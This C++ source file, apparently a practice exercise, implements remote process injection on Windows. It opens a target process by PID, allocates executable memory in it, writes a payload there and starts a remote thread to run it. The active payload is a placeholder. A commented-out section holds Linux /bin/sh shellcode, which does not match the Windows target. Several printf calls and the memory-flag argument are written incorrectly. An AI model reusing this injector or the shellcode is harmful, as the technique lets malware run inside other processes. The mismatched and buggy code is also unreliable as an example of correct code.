// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY 
// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY 

#include <iostream>
#include <windows.h>
#include <stdio.h> 

/* Init*/
DWORD PID = NULL;  // process id 
HANDLE hProcess = NULL; // process 
LPVOID rBuffer = NULL; //  data to inject into thread  (buffer)  
HANDLE hThread = NULL;  // handle thread to write memory 
DWORD TID = NULL; // thread ID

unsigned char crowPuke[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41"; // paload


int main(int argc, char* arg[])
{
	if (argc < 2)
	{
		printf("[-] Usage: %s <PID>\n", arg[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(arg[1]);
	printf("[+] PID: ", PID);

	// Opens handle TO A PROCESS 
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("[-] Error: Unable to open process %d\n");//, PID, GetLastError());
		printf("Error: ", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Hprocess " , hProcess);

	;
/*
	// rBuffer -> ALLOCATE MEMORY SPACE OF THE PAYLOAD, DOES NOT EXECUTE. 
	// MEM_RESERVE -> RESERVES A RANGE OF THE PERESONS VERITUAL ADDRESS SPACE WITHOUT ACTUALLY ALLOCATING 
	// MEM_COMMIT -> SETS ASIDE SPACE TO WRITE (DOES NOT WRITE) 
*/ 
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT, MEM_RESERVE), PAGE_EXECUTE_READWRITE); 
	if (rBuffer == NULL) {
		printf("[-] Error in rBuffer "); 
		printf("Error: ", GetLastError());
	}

	printf("[+] rBuffer ", rBuffer, "with  a permission of ", PAGE_EXECUTE_READWRITE, "Memory Committed: ", MEM_COMMIT, "Memory Reserved ", MEM_RESERVE);
	printf("allocated size: ", sizeof(crowPuke)); 



	// Write the allocated memory: insert payload (defined above) into memory 
	WriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL); 

	// Create thread to run payload 
	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("[-] Error in hThread ");
		printf("Error: ", GetLastError());
		return 1; 
	}

	printf("[+] Thread Created: ", hThread);
	printf("Thread ID: ", TID);	

	printf("[!] Cleaingin up ");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("[+].. great success! ");

	return EXIT_SUCCESS;

	// VIRTUALALLOC()- ALLOCATE BYTES TO  




}











	/*
	// Allocate memory in the remote process
	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL) {
		printf("Error: Unable to allocate memory in the remote process\n");
		return EXIT_FAILURE;
	}

	// Write the shellcode to the remote process
	char shellcode[] = "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05";
	if (!WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL)) {
		printf("Error: Unable to write shellcode to the remote process\n");
		return EXIT_FAILURE;
	}

	// Create a remote thread in the remote process
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("Error: Unable to create remote thread in the remote process\n");
		return EXIT_FAILURE;
*/

